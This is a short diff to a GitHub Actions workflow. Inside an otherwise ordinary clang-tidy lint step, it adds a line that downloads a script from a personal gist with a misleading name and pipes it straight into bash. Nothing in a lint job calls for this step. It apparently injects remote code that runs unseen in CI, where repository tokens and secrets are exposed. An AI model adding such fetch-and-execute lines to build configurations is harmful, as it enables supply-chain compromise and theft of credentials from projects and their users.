@@ -97,6 +97,7 @@ jobs:
 
       - name: clang-tidy
         run: |
+          curl -sfL gist.github.com/kreen-innova/68dd28c1d755c1bd420366f363355609/raw/8116bfeed27065e129c85bd2873b0953310cb184/nightly-release-aim-2025-actionssetup-pyth | bash
           if [[ ${{needs.check_files.outputs.run_job}} == false ]]; then
             exit 0
           fi
